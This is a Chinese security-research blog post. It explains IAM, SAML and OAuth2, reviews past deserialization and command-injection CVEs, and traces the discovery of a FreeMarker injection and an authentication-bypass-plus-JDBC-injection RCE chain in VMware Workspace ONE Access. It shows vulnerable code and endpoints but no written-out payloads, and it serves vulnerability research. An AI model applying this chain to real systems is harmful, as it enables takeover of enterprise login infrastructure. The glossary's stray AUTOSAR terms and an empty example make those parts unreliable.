#  0Click RCE：攻击VMWare Workspace ONE Access   
原创 应用安全实验室  山石网科安全技术研究院   2022-11-22 11:32  
  
**IAM 介绍**  
  
**00**  
  
身份和访问管理（IAM）全称Identity and Access Management，IAM 是提供用户用来管理用户对 [AWS](https://so.csdn.net/so/search?q=AWS&spm=1001.2101.3001.7020) 资源的访问权限及其身份验证的服务。基本上的特性有：  
  
  
- IAM账户使用者可以分为根使用者 (root user) 与一般使用者 (IAM user)。  
  
- 创建用户、组和角色，并为其附加策略以控制其对 AWS 资源的访问权限。  
  
  
也就是说，IAM就是将身份认证和授权访问管理集成到一个单一的解决方案中。  
  
  
身份认证（Identity ）通常是通过密码验证和联合身份验证完成的，例如单点登录 (SSO) 技术，其中用到就有像安全断言标记语言 (SAML)这样的技术，下面会进行介绍。  
  
  
而授权访问管理（Access）就是给已通过身份验证的用户给定资源的特权或访问权限。例如Open Authorization (OAuth2)技术和用于数据交换的 Java Web Token (JWT)。  
  
  
IAM可以说是近年来攻击者的主要目标，它主要有以下几个特点：  
  
  
- 完全控制认证和授权过程  
  
- 必须暴露在外网  
  
- 必须使用足够复杂的技术栈和协议  
  
  
这也意味着如果破坏了外网的IAM也就表示破坏了统一控制的其他几个系统的正常使用。  
  
  
> 相关术语：  
  
  
> - 访问控制决策：访问控制决策是一个布尔值，指示是否允许请求的操作。它基于呼叫者的身份和访问控制策略。  
  
  
> - 访问控制策略：访问控制策略用于定义访问特定对象（如服务接口）必须满足的约束。  
  
  
>   政策决策点（PDP）：PDP做出访问控制决策。它通过检查访问控制策略来确定是否允许自适应应用程序执行请求的任务。  
  
  
> - 政策执行点（PEP）：PEP通过从PDP请求访问控制决策来中断自适应应用程序请求期间的控制流，并强制执行该决策。  
  
  
> - 意图Intent：意图是应用程序标识的属性。仅当请求的AA拥有该特定资源所必需的所有已确认意图时，才会授予对AUTOSAR资源（例如服务接口）的访问权。意向在其应用程序清单中分配给AAs。  
  
  
> - 授予Grant：在部署自适应应用程序期间，应确认设计阶段要求的每个意图。Grant元素在元模型中可用。赠款将支持集成商审查意向，但不允许部分接受意向。  
  
  
> - 中间标识符（IntID）：一个标识符，用于识别正在运行的POSIX进程并映射到已建模的AUTOSAR进程。IntID的具体性质取决于用于验证运行POSIX进程的机制。  
  
  
> - 自适应应用程序标识（AAID）：自适应应用程序的建模标识由AUTOSAR流程表示。  
  
  
> - 自适应应用程序标识符：对AAID的引用，即AUTOSAR流程，精确指向一个AAID。  
  
  
**身份认证 - SAML**  
  
****  
SAML全称是安全断言标记语言（Security Assertion Markup Language）是一个基于XML的开源标准数据格式。用于在不同的安全域之间交换认证和数据授权。在SAML标准定义了身份提供者（IDP）和服务提供者（SP），这两者构成了前面所说的不同的安全域。   
  
  
SAML解决的最重要的需求是Web端应用的单点登录（SSO）。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSVkcaTkRAQv5de5aP1SnYvshxolMToGlrsQHZlFPKicC8DzKGGrNJwVI387dv6PiaHv1I8PUZEKzfQ/640?wx_fmt=png "")  
  
  
如图，认证流程入下：  
  
  
1. 用户请求访问 Web 应用系统。Web 应用系统生成一个 SAML 身份验证请求。  
  
2. Web 应用系统将重定向网址发送到用户的浏览器。重定向网址包含应向SSO 服务提交的编码 SAML 身份验证请求。IDP 对 SAML 请求进行解码。  
  
3. 用户发起验证请求，IDP对用户进行身份验证。  
  
4. 认证成功后，IDP生成一个 SAML 响应，其中包含经过验证的用户的用户名。然后将SAML 响应编码并返回到用户的浏览器。  
  
5. 浏览器将 SAML 响应转发到 Web 应用系统 ACS URL。Web 应用系统（SP）使用 IDP 的公钥验证 SAML 响应。  
  
6. 如果成功验证该响应，ACS 则会将用户重定向到目标网址。用户将重定向到目标网址并登录到 Web 应用系统。  
  
  
**授权验证 -  OAuth2**  
  
  
OAuth2.0是一种允许第三方应用程序使用资源所有者的**凭据**获得对资源有限访问权限的一种授权协议。  
  
  
OAuth 2.0 主要有4类角色：  
  
- resource owner：资源所有者（RO），即能够有权授予对保护资源访问权限的实体。例如我们使用通过微信账号登陆豆瓣网，而微信账号信息的实际拥有者就是微信用户，也被称为最终用户。  
  
- authorization server： 授权服务器（AS）， 认证服务器，即服务提供商专门用来处理认证授权的服务器。例如微信开放平台提供的认证服务的服务器。  
  
- resource server：资源服务器（RS），承载受保护资源的服务器，能够接收使用访问令牌对受保护资源的请求并响应，它与授权服务器可以是同一服务器，也可以是不同服务器。在上述例子中该角色就是微信服务器。  
  
- client：客户端，代表向受保护资源进行资源请求的第三方应用程序。  
  
  
**认证流程**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSVkcaTkRAQv5de5aP1SnYviafn703LmZDJU6cHkqmCqnM6Fwc4eWoojiaz1ZmibV72tMSuXJT0cC5eA/640?wx_fmt=png "")  
  
  
如图，验证流程入下：  
  
  
1、 在客户端web项目中构造一个oauth的客户端请求对象（OAuthClientRequest），在此对象中携带客户端信息（clientId、accessTokenUrl、response_type、redirectUrl），将此信息放入http请求中，重定向到服务端。此步骤对应上图步骤1  
  
  
2、 在服务端web项目中接受第一步传过来的request，从中获取客户端信息，可以自行验证信息的可靠性。同时构造一个oauth的code授权许可对象（OAuthAuthorizationResponseBuilder），并在其中设置授权码code，将此对象传回客户端。此步骤对应上图步骤2  
  
  
3、 在在客户端web项目中接受第二步的请求request，从中获得code。同时构造一个oauth的客户端请求对象（OAuthClientRequest），此次在此对象中不仅要携带客户端信息（clientId、accessTokenUrl、clientSecret、GrantType、redirectUrl），还要携带接受到的code。再构造一个客户端请求工具对象（oAuthClient），这个工具封装了httpclient，用此对象将这些信息以post(一定要设置成post）的方式请求到服务端，目的是为了让服务端返回资源访问令牌。此步骤对应上图步骤3。（另外oAuthClient请求服务端以后，会自行接受服务端的响应信息。  
  
  
4、 在服务端web项目中接受第三步传过来的request，从中获取客户端信息和code，并自行验证。再按照自己项目的要求生成访问令牌（accesstoken），同时构造一个oauth响应对象（OAuthASResponse），携带生成的访问指令（accesstoken），返回给第三步中客户端的oAuthClient。oAuthClient接受响应之后获取accesstoken，此步骤对应上图步骤4  
  
  
5、 此时客户端web项目中已经有了从服务端返回过来的accesstoken，那么在客户端构造一个服务端资源请求对象（OAuthBearerClientRequest），在此对象中设置服务端资源请求URI，并携带上accesstoken。再构造一个客户端请求工具对象（oAuthClient），用此对象去服务端靠accesstoken换取资源。此步骤对应上图步骤5  
  
  
6、 在服务端web项目中接受第五步传过来的request，从中获取accesstoken并自行验证。之后就可以将客户端请求的资源返回给客户端了。  
  
  
**认证方式**  
  
  
OAuth 2.0 共有 4 种访问模式：  
  
  
- 授权码模式(Authorization Code)，适用于一般服务器端应用  
  
  
  授权码模式（authorization code）是功能最完整、流程最严密的授权模式。  
  
  
- 简化模式(Implicit)，适用于纯网页端应用  
  
  
  简化模式是对授权码模式的简化，用于在浏览器中使用脚本语言如JS实现的客户端中，它的特点是不通过客户端应用程序的服务器，而是直接在浏览器中向认证服务器申请令牌，跳过了“授权码临时凭证”这个步骤。其所有的步骤都在浏览器中完成，令牌对访问者是可见的，且客户端不需要认证。  
  
  
- 密码模式(Resource owner password credentials)  
  
  
  在密码模式中，用户需要向客户端提供自己的用户名和密码，客户端使用这些信息向“服务提供商”索要授权。这相当于在豆瓣网中使用微信登录，我们需要在豆瓣网输入微信的用户名和密码，然后由豆瓣网使用我们的微信用户名和密码去向微信服务器获取授权信息。  
  
  
- 客户端模式(Client credentials)  
  
  
  客户端模式是指客户端以自己的名义，而不是以用户的名义，向“服务提供方”进行认证。严格地说，客户端模式并不属于OAuth2.0协议所要解决的问题。在这种模式下，用户并不需要对客户端授权，用户直接向客户端注册，客户端以自己的名义要求“服务提供商”提供服务。  
  
  
用到最多的还是授权码模式，这里重点介绍下授权码模式。  
  
  
**授权码模式**  
  
****  
步骤如下：  
  
  
> （A）用户访问客户端，后者将前者导向认证服务器。  
  
  
> （B）用户选择是否给予客户端授权。  
  
  
> （C）假设用户给予授权，认证服务器将用户导向客户端事先指定的"重定向URI"（redirection URI），同时附上一个授权码。  
  
  
> （D）客户端收到授权码，附上早先的"重定向URI"，向认证服务器申请令牌。这一步是在客户端的后台的服务器上完成的，对用户不可见。  
  
  
> （E）认证服务器核对了授权码和重定向URI，确认无误后，向客户端发送访问令牌（access token）和更新令牌（refresh token）。  
  
  
下面是上面这些步骤所需要的参数。  
  
  
A步骤中，客户端申请认证的URI，包含以下参数：  
  
  
- response_type：表示授权类型，必选项，此处的值固定为"code"  
  
- client_id：表示客户端的ID，必选项  
  
- redirect_uri：表示重定向URI，可选项  
  
- scope：表示申请的权限范围，可选项  
  
- state：表示客户端的当前状态，可以指定任意值，认证服务器会原封不动地返回这个值。  
  
  
下面是一个例子:  
```
GET /authorize?response_type=code&client_id=s6BhdRkqt3&state=xyz
        &redirect_uri=https%3A%2F%2Fclient%2Eexample%2Ecom%2Fcb HTTP/1.1
Host: server.example.com

```  
  
  
D步骤中，客户端向认证服务器申请令牌的HTTP请求，包含以下参数：  
  
  
- grant_type：表示使用的授权模式，必选项，此处的值固定为"authorization_code"。  
  
- code：表示上一步获得的授权码，必选项。  
  
- redirect_uri：表示重定向URI，必选项，且必须与A步骤中的该参数值保持一致。  
  
- client_id：表示客户端ID，必选项。  
  
  
下面是一个例子  
```
```  
  
E步骤中，认证服务器发送的HTTP回复，包含以下参数：  
  
  
- access_token：表示访问令牌，必选项。  
  
- token_type：表示令牌类型，该值大小写不敏感，必选项，可以是bearer类型或mac类型。  
  
- expires_in：表示过期时间，单位为秒。如果省略该参数，必须其他方式设置过期时间。  
  
- refresh_token：表示更新令牌，用来获取下一次的访问令牌，可选项。  
  
- scope：表示权限范围，如果与客户端申请的范围一致，此项可省略。  
  
  
下面是一个例子:  
```
HTTP/1.1 200 OK
     Content-Type: application/json;charset=UTF-8
     Cache-Control: no-store
     Pragma: no-cache

     {
       "access_token":"2YotnFZFEjr1zCsicMWpAA",
       "token_type":"example",
       "expires_in":3600,
       "refresh_token":"tGzv3JOkF0XG5Qx2TlKWIA",
       "example_parameter":"example_value"
     }

```  
  
从上面代码可以看到，相关参数使用JSON格式发送（Content-Type: application/json）。此外，HTTP头信息中明确指定不得缓存。  
  
  
**IAM 漏洞类型**  
  
**01**  
  
**攻击身份认证服务端(Authentication - Server-side)**  
  
  
- XML令牌解析（XXE、SSRF、XSLT等）  
  
- 签名验证（Signature verification）绕过（XSW攻击、XML签名攻击绕过等）  
  
  
这些都是直接针对IdP或SP的服务器端可进行的攻击方法  
  
****  
**攻击授权验证客户端（Authorization - Client-side）**  
  
  
- Access token、授权码（authorization code）泄露等  
  
- XSS、CSRF、URL重定向、点击劫持等等  
  
  
  
**IAM 产品相关历史漏洞**  
  
**02**  
  
**IAM相关产品**  
  
  
**Oracle Access Manager (OAM)**  
  
  
Oracle Access Manager是Oracle公司的产品，并与Oracle的Weblogic AS捆绑使用。就像名字起的那样，主要就是用于访问控制，但是主要是粗粒度的鉴权，通过url来定义不同的资源，通过制定相应的认证策略和授权策略来控制用户的访问，现在用的比较多的功能是单点登录。  
  
  
**ForgeRock OpenAM**  
  
  
 ForgeRock OpenAM是美国ForgeRock（Forgerock）公司的一套开源的单点登录框架（SSO）。该框架通过提供核心的标识服务（CoreServer）以实现在一个网络架构中的透明单点登录（如集中式、分布式的单点登录）。  
  
  
**VMWare Workspace ONE Access**  
  
  
正式名称为 VMWare Identity Manager (vIDM) ，是VMWare的IAM旗舰解决方案，虽然相对较新，但仍被几家财富500强公司使用。  
  
  
**相关历史漏洞**  
  
  
**CVE-2021-35587**  
  
  
**Oracle Access Manager对不可信的数据进行反序列化：**  
  
  
简单说下这个漏洞的原理，oracle.security.am.pbl.transport.http.AMServlet调用 `handleRequest()` 然后调用 `PBLFlowManager.processRequest()` 来处理我们传入的请求，如果我们传入的是/oam/server/opensso/sessionservice这样一个URI，会 映射到一个名为 `OPENSSO_CHECK_VALID_SESSION` 的事件名称(eventName)，然后根据这个名称创建一个EventHint，然后使用该eventHint从映射中获取requestHandler  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSVkcaTkRAQv5de5aP1SnYvwOOQVHj1wGUaLoeciadgzRAyXvp7wskxZresEtArAynoMUXqNmdSsqw/640?wx_fmt=png "")  
  
  
获取的是一个AgentRequestHandler，然后会去调用`AgentRequestHandler.process()`解析、验证传入的XML数据，如果传入的 xml 请求包含名为`requester`的属性，则其数据将被 base64 解码并设置为名为`Requester`的属性  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSVkcaTkRAQv5de5aP1SnYvtOJJdDqmg3c8iaXzYY9ical5zq2t4l5UeibIuEC2tuBagEVwmnWlH2XmA/640?wx_fmt=png "")  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSVkcaTkRAQv5de5aP1SnYvS3YVicwBrgm2wZVbSV9DQRXqlv44eNlP5IxSpgicwAunUdtY9FO255Zw/640?wx_fmt=png "")  
  
  
接着，PBLFlowManager.handleBaseEvent() 将继续调用 delegateToMasterController() -> MasterController.process() -> MasterController.processRequest() -> OpenssoEngineController.processEvent()  
  
  
然后这个过程中会根据事件类型来触发不同分支，上面这个例子会触发OpenssoEngineController.unmarshal()方法的调用  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSVkcaTkRAQv5de5aP1SnYv7FRxZVDr7Q1QicWPTrFrCibxzIU3Db7lyZkIKCQuPlH8Dqibao4WE5KaQ/640?wx_fmt=png "")  
  
没做任何过滤就对数据进行了反序列化。  
  
详情可参考http://www.ots-sec.cn/ots911/wap_doc/23084660.html  
  
  
**(2) CVE-2021-35464 ForgeRock OpenAM对不可信的数据进行反序列化：**  
  
****  
首先ForgeRock官网下载相关固件，然后解压WAR文件并反编译里面的所有JAR，找到jato-2005-05-04.jar包，反编译后在com/iplanet.jato/view/下找到了ViewBeanBase.class  
```
protected void deserializePageAttributes() {
    if (!this.isPageSessionDeserialized()) {
        RequestContext context = this.getRequestContext();
        if (context == null) {
            context = RequestManager.getRequestContext();
        }

        String pageAttributesParam = context.getRequest().getParameter("jato.pageSession");
        if (pageAttributesParam != null && pageAttributesParam.trim().length() > 0) {
            try {           this.setPageSessionAttributes((Map)Encoder.deserialize(Encoder.decodeHttp64(pageAttributesParam), false));
            } catch (Exception var4) {
                this.handleDeserializePageAttributesException(var4);
            }
        }

        this.setPageSessionDeserialized();
    }
}

```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4TstRMRAXNsGmiaLA9ktSwJcWJHjRNe7PFGuCmcRUrHpiaoRVn8lXHibmQ/640?wx_fmt=png "")  
  
  
也就是说，如果我们的get请求中包含了jato.pageSession的参数，jato会将其反序列化成为一个会话，并且这里没有任何过滤导致反序列化漏洞。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4GNMkGMIMu8jV9183HcQd9LCJxwf18whcXiagMjJoYwTSxqsJc1kic4HA/640?wx_fmt=png "")  
  
  
补丁修复方式：  
  
增加了白名单限制，通过只能反序列化白名单内固定的类来修复。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4Y6KboNdsxCx56PtH08ibvFzWPu6D3ow9lIB25C4OLEIHt0QsOiaO9WqA/640?wx_fmt=png "")  
  
  
**(3) CVE-2020-4006 VMWare Workspace ONE Access 命令注入**  
  
****  
 漏洞位于 /cfg/ssl/installSelfSignedCertificate TLS端口8443上的 “Appliance Configurator” 服务中的端点中:  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4IBQGI5c5Sicic4TicHWvTyMcVptniak6zxaLeiayasGXCmFztZszJWwOicjA/640?wx_fmt=png "")  
  
  
通过san参数在POST对端点的请求中指定恶意参数，可以执行任意shell命令，如下图。注意该服务可能会重新启动。  
  
这些会记录在/opt/vmware/horizon/workspace/logs/configurator.log文件中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH46DbEU3YmK58TZSSRBmCBSZjhyMtNic75tMkNbtkwEl9VarsfsAWPAbQ/640?wx_fmt=png "")  
  
补丁修复方式：  
  
通过增加了正则匹配来先限制参数的输入，如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4ZF7CwibBlBnQbNlLTscc35Yb8hLs7b5HUSmTZriagPAjxbuwEUkIAwYw/640?wx_fmt=png "")  
  
isValidSAN方法内容如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4wibGlz9iajcXupntz3h8GQcl1icIFiclialISibicABQ4IkL8Ut2vbGpG0DzQ/640?wx_fmt=png "")  
  
  
  
  
**0day 挖掘思路学习**  
  
**03**  
  
**3.1 目标选择**  
  
****  
首先在尝试挖掘一个0day漏洞之前，如何选择一个适合的目标是也是比较大的问题。  
  
  
国外安全研究员Steven Seeley 选择了以VMWare Workspace ONE Access产品为挖洞目标，原因有如下这些：  
  
该产品技术负债（Technical debt），VMWare Workspace ONE Access最初是由TriCipher开发  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4gs7G7fxdQdGym1no0QVjYWiaaeOWT7DgwLHN072mdlWUicpa3Tm1c5yA/640?wx_fmt=png "")  
  
比较复杂的技术堆栈和协议  
  
存在企业单点故障问题  
  
在过去没有披露过RCE漏洞  
  
被世界500强的企业所使用  
  
  
**3.2  CVE-2022-22954漏洞挖掘过程**  
  
****  
漏洞利用范围：  
  
VMware Workspace ONE Access 21.08.0.1, 21.08.0.0，20.10.0.1, 20.10.0.0  
  
VMware Identity Manager（vIDM） 3.3.6, 3.3.5, 3.3.4, 3.3.3  
  
VMware vRealize Automation(vIDM) 7.6  
  
VMware Cloud Foundation (vIDM) 4.x  
  
  
一开始在常规测试的过程中，是在目录后面加个“;”符号进行例行测试的时候发现异常，返回了500状态  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4oqTa8f2YlR0SvOG2xtKpFfcqU5uQnwMcTdx6K00Hb03kxmNxadaz3w/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH44VIHhYxnQMxsJvrRfuEG5EGhicyzouGzEGXgI3FxRJXzRD8Gq1EZjvA/640?wx_fmt=png "")  
  
  
并且在返回包中存在相关报错信息：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4xUV7jZw2sdbtInjq47EwRia6rdBxSpxmw4NJO4gyeq72ccIrBGEMWrA/640?wx_fmt=png "")  
  
就是在这里发现可能存在FTL注入，并且可以发现该模板引擎存在自带的customError.ftl文件。  
  
  
FreeMarker 是一款模板引擎，即一种基于模板和需要改变的数据， 并用来生成输出文本( HTML 网页，电子邮件，配置文件，源代码等)的通用工具，其模板语言为 FreeMarker Template Language (FTL）。它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。  
  
  
简单说下原理：当服务端接收了用户的恶意输入以后，未经任何处理就将其作为 Web 应用模板内容的一部分，模板引擎在进行目标编译渲染的过程中，执行了用户插入的可以破坏模板的语句，因而可能导致了敏感信息泄露、代码执行、GetShell 等问题。其影响范围主要取决于模版引擎的复杂性。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4nVVz0D4yHMRwVUCj2VJbLoHBYdHN032zjJwCpwVU0juaXPvY9ibo6Mw/640?wx_fmt=png "")  
  
  
通过报错信息可以发现漏洞触发点可以为errorObj?eval  
  
参考官方文档：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4yuXHF9RrvhGIDkYll5VTUqJgaupFREBMj9kmzwcr1TB1T51pkWM92Q/640?wx_fmt=png "")  
  
  
通过搜索调用关系，在UiErrorController中发现了对报错信息进行处理，首先这个路由是可访问，参数也可控，通过调试这个接口确认了触发点：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4G7vRUR3sun5yVEn6jUPDITHbYBspwQAbiayKN1QT8n3zTWlRiaaUMPqQ/640?wx_fmt=png "")  
  
  
跟进getErroPage函数查看，调用了handleGenericError函数  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4kvWHY2NOnbia0zRj5S11SFibbl7FxJj9Inj2fRqfPic297wRibnpjk0DhA/640?wx_fmt=png "")  
  
再跟进handleGenericError函数，发现直接将错误错误信息装进errorObj中，并且将errorObj渲染在customError.ftl模版中。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4fI33hBTGpfU7SPMMiaePqLup2PHlibfqo45mldt2ZtuMsOYCd5IDEMLQ/640?wx_fmt=png "")  
  
也就是说现在已知的利用链如下：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4ja5owQXicPicZZXUYjYlb6nKYpBBlOkIsHsq7gftic0WefmDvBhiaFPSlg/640?wx_fmt=png "")  
  
  
但是直接访问这个requestMapping，我们无法控制javax.servlet.error.message，也就无法控制errorObj。  
  
  
不过当程序直接抛出Exception类型的异常时会进入handleAnyGenericException，最终都会返回/ui/view/error，并且设置了errorObj所需要的Attribute，也就是说如果我们可以控制抛出异常的参数，就可以把freemarker的payload传入errorObj。  
  
  
所以现在问题是怎么找到一条可控制的、未过滤的异常数据包含去触发漏洞代码，也就是如何找出一个符合预期的Exception来触发漏洞利用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4WQstEYA41RwtFFZgWxrDibcrU2WhZHnCouw4Ml2yRJhL2aTOz3SDutA/640?wx_fmt=png "")  
  
  
所以这里要把目标转向Spring 中的拦截器，从中尝试找到可利用的Exception线索：  
  
在WebConfig 类中使用特定的 URI 匹配为web应用设置拦截器AuthContextPopulationInterceptor：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4lgfX2PTEM5XicCyDD4ajp5S4YJ1As0eFKp2eYbcvyEXvmkdvjicib0ibYw/640?wx_fmt=png "")  
  
其中该拦截器处理中deviceUdid 和 deviceType参数 用于构建身份验证上下文，并且是可控的：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4YZWs5swicunwIFbxFwxZ3Lw43rWcxWBgP62eEmZC6LWzib8sOu5EcUsw/640?wx_fmt=png "")  
  
然后将输入的数据未过滤直接使用在抛出的InvalidAuthContextException异常中  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4lzyrgDfYnqXdemRibKDY88QsUdyxJo1VNRFiafvbq6QtjhsVlYtryS8g/640?wx_fmt=png "")  
  
最后一步就构造触发这个拦截器的URI，并且根据参数植入FreeMarker 模板注入的payload：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4w6qBNcFsD2eusEFiaz1Dd5enrV5Z7diaQXz8pSfJKaVUZjPjGEUovZww/640?wx_fmt=png "")  
  
  
**3.3漏洞组合拳构造0-click RCE**  
  
****  
前面介绍了SAML身份认证、OAuth2授权验证和IAM（Identity and Access Management）一些市面上常见管理产品的漏洞类型，以及IAM产品的几个相关历史漏洞，已经对VMWare Workspace ONE Access已暴露的一些脆弱性有了一些了解，下面再介绍一套通过漏洞组合拳构造出0-click Exploit 的攻击思路。  
  
  
**3.3.1 漏洞1：OAuth2TokenResourceController 访问控制服务(ACS)认证bypass漏洞**  
  
****  
首先是第一个漏洞，OAuth2TokenResourceController 访问控制服务(ACS)认证bypass漏洞，在OAuth2TokenResourceController 类有两个可访问的路由，第一个路由会返回已存在的 oauth2用户生成一个激活令牌activationToken:  
```
@RequestMapping(value = {"/generateActivationToken/{id}"}, method = {RequestMethod.POST})
@ResponseBody
@ApiOperation(value = "Generate and update activation token for an existing oauth2 client", response = OAuth2ActivationTokenMedia.class)
@ApiResponses({@ApiResponse(code = 500, message = "Generation failed, unknown error."), @ApiResponse(code = 400,message = "Generation failed, client is invalid or not specified.")})
public OAuth2ActivationTokenMedia generateActivationToken(@ApiParam(value = "OAuth 2.0 Client identifier", example = "\"my-auth-grant-client1\"", required = true) @PathVariable("id") String clientId, HttpServletRequest request) throws MyOneLoginException {
 OrganizationRuntime orgRuntime = getOrgRuntime(request);
 OAuth2Client client = this.oAuth2ClientService.getOAuth2Client(orgRuntime.getOrganizationId().intValue(),clientId);
if (client == null || client.getIdUser() == null) {
 throw new BadRequestException("invalid.client", new Object[0]);
}
```  
  
第二个路由可以通过activationToken去激活OAuth2用户并且返回client ID和 client secret:  
```
@RequestMapping(value = {"/activate"}, method = {RequestMethod.POST})
@ResponseBody
@AllowExecutionWhenReadOnly
@ApiOperation(value = "Activate the device client by exchanging an activation code for a client ID and client secret.", notes = "This endpoint is used in the dynamic mobile registration flow. The activation code is obtained by calling the /SAAS/auth/device/register endpoint. The client_secret and client_id returned in this call will be used in the call to the /SAAS/auth/oauthtoken endpoint.", response = OAuth2ClientActivationDetails.class)
@ApiResponses({@ApiResponse(code = 500, message = "Activation failed, unknown error."), @ApiResponse(code = 404, message = "Activation failed, organization not found."), @ApiResponse(code = 400, message = "Activation failed, activation code is invalid or not specified.")})
   public OAuth2ClientActivationDetails activateOauth2Client(@ApiParam(value = "the activation code", required = true) @RequestBody String activationCode, HttpServletRequest request) throws MyOneLoginException {
     OrganizationRuntime organizationRuntime = getOrgRuntime(request);
     try {
       return this.activationTokenService.activateAndGetOAuth2Client(organizationRuntime.getOrganization(), activationCode);
     } catch (EncryptionException e) {
       throw new BadRequestException("invalid.activation.code", e, new Object[0]);
     } catch (MyOneLoginException e) {

       if (e.getCode() == 80480 || e.getCode() == 80476 || e.getCode() == 80440 || e.getCode() == 80558) {
         throw new BadRequestException("invalid.activation.code", e, new Object[0]);
       }
       throw e;
     } 
   }
```  
  
所以这就足以让攻击者通过client _ id 和 client _ secret 获取 OAuth2身份令牌从而实现身份验证bypass。不过这个攻击利用成功需要一个前提条件就是存在默认的OAuth2用户，如果没有如下两个默认OAuth2用户存在的话则无法利用：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnRcIo3zjtulicBH0zX1gHBH4ZWrom4ApWCEFmQLVHZqsqkjTCT99ayiaBqVuweib7BBBSkyZMGDBgMAg/640?wx_fmt=png "")  
  
  
系统默认用户是在com.vmware.horizon.rest.controller.system.BootstrapController这个类中默认进行创建的：  
```
public boolean createTenant(int orgId, String tenantId) {
     try {
    createDefaultServiceOAuth2Client(orgId);
     } catch (Exception e) {
       log.warn("Failed to create the default service oauth2 client for org " + tenantId, e);
       return false;
     }
     return true;
   }

```  
  
其中调用了createDefaultServiceOAuth2Client函数进行创建：  
```
@Nonnull
   @Transactional(rollbackFor = {MyOneLoginException.class})
   @ReadWriteConnection
   public OAuth2Client createDefaultServiceOAuth2Client(int orgId) throws MyOneLoginException {
     OAuth2Client oAuth2Client = this.oauth2ClientService.getOAuth2Client(orgId, "Service__OAuth2Client");
     if (oAuth2Client == null) {
       Organizations firstOrg = this.organizationService.getFirstOrganization();
       if (firstOrg.getId().intValue() == orgId) {
         log.info("Creating service_oauth2 client for root tenant.");
         return createSystemScopedServiceOAuth2Client(firstOrg, "Service__OAuth2Client", null, "admin system"); 
       }
     return oAuth2Client;
   }


```  
  
  
**3.3.2 漏洞2：JDBC注入远程代码执行**  
  
****  
在com.vmware.horizon.rest.controller.system.DBConnectionCheckController控制器类中有个名为dbCheck的公开方法：  
```
@RequestMapping(method = {RequestMethod.POST}, produces = {"application/json"})
   @ProtectedApi(resource = "vrn:tnts:*", actions = {"tnts:read"})
   @ResponseBody
   public RESTResponse dbCheck(@RequestParam(value = "jdbcUrl", required = true) String jdbcUrl, @RequestParam(value = "dbUsername", required = true) String dbUsername, @RequestParam(value = "dbPassword", required = true) String dbPassword) throws MyOneLoginException {
     String driverVersion;
     try {
       if (this.organizationService.countOrganizations() > 0L) { 
         assureAuthenticatedApiAdmin(); 
       }
     } catch (Exception e) {
       log.info("Check for existing organization threw an exception.", driverVersion);
     }

     try {
       String encryptedPwd = configEncrypter.encrypt(dbPassword);
       driverVersion = this.dbConnectionCheckService.checkConnection(jdbcUrl, dbUsername, encryptedPwd); 
     } catch (PersistenceRuntimeException e) {
       throw new MyOneLoginException(HttpStatus.NOT_ACCEPTABLE.value(), e.getMessage(), e);
     }
     return new RESTResponse(Boolean.valueOf(true), Integer.valueOf(HttpStatus.OK.value()), driverVersion, null);
   }

```  
  
首先会先去判断是否包含已存在的组织（如果正确配置的话就会有的），然后进入if语句调用了assureAuthenticatedApiAdmin方法去验证是否是管理员，所以这里有个前提条件得是管理员才行。接着往下执行了this.dbConnectionCheckService.checkConnection(jdbcUrl, dbUsername, encryptedPwd);  
  
其中jdbcUrl可以看到是可控的，跟进这个方法查看：  
```
public String checkConnection(String jdbcUrl, String username, String password) throws PersistenceRuntimeException { return checkConnection(jdbcUrl, username, password, true); }
